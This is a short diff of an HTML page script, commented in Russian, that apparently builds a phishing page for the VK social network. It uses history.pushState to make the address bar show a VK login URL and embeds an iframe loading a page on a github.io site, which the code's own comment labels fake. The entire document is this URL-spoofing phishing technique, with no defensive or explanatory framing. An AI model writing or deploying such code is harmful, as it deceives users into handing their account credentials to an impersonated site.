@@ -19,12 +19,14 @@
 </head>
 <body>
   <script>
-    // Подменяем URL на https://vk.com/logout без перезагрузки
-    history.pushState(null, "", "https://vk.com/logout");
+    // Подменяем URL на https://vk.com/logout
+    history.pushState(null, "", "https://vk.com/login");
 
-    // Добавляем iframe с фейковой страницей
+    // Создаем iframe
     const iframe = document.createElement('iframe');
-    iframe.src = "https://jkeep1990.github.io/VK_iFrame/fake.html";
+    iframe.src = "https://jkeep1990.github.io/VK_iFrame/fake.html"; // URL фейковой страницы
+
+    // Добавляем iframe в body
     document.body.appendChild(iframe);
   </script>
 </body>
